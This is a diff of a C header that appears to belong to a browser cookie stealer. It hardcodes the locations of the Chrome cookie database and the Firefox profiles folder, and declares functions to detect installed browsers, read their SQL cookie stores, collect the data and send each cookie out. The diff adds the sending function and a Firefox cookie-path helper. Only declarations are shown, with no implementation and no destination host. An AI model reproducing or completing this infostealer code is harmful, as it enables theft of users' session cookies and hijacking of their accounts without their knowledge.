@@ -1,3 +1,5 @@
+#include "type.h"
+
 #ifndef CH_PATH
  #define CH_PATH "AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies"
 #endif
@@ -14,35 +16,6 @@
  #define FF_PATH "AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\"
 #endif
 
-
-#ifndef uint8_t
-typedef unsigned char
-uint8_t;
-
-#endif
-
-#ifndef uint16_t
-typedef unsigned short
-uint16_t;
-
-#endif
-
-#ifndef uint32_t
-typedef unsigned int
-uint32_t;
-
-#endif
-
-#ifndef cookies_datatype
-
-typedef struct {
-        char    host[100];
-        char    value[256];
-        uint8_t b_type;
-}
-cookies_datatype;
-
-#endif
 
 #ifndef browser_prediction
 
@@ -64,8 +37,12 @@ void dir_reader(const char* directory, char** files);
 
 uint8_t check_file_in_dir(char* filename, const char* dir);
 
+char* get_ff_cookies_path(char* curr_path);
+
 browser_prediction check_browsers(char* local, char* roaming);
 
 void collect_data(browser_prediction status);
 
 void get_sql(const char* sql_path, uint8_t bt);
+
+int send_single_cookie(cookies_datatype c_value);
